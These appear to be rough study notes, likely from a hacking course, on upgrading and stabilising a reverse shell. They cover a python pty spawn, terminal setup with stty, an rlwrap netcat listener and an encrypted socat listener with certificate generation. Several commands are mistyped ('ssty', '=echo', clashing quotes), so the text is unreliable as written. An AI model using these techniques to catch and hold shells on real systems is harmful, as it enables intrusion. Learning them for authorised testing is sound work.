1 .python -c 'import pty;pty.spawn('/bin/bash')' creats a shell instnce
export TERM=xterm clear
this gives acces to commands like clear 

background the shell using ssty raw =echo;fg
this turns of our own echo thus enabling auto complete and ctrl +c to kill processes

tech 2 
sudo apt install rlwrap
rlwrap nc -lvnp <port>
ssty raw -echo;fg
	
	socat
	
	
	`openssl req --newkey rsa:2048 -nodes -keyout shell.key -x509 -days 362 -out shell.crt`
	`cat shell.key shell.crt > shell.pem`
	`socat OPENSSL-LISTEN:<PORT>,cert=shell.pem,verify=0 -`
	
	

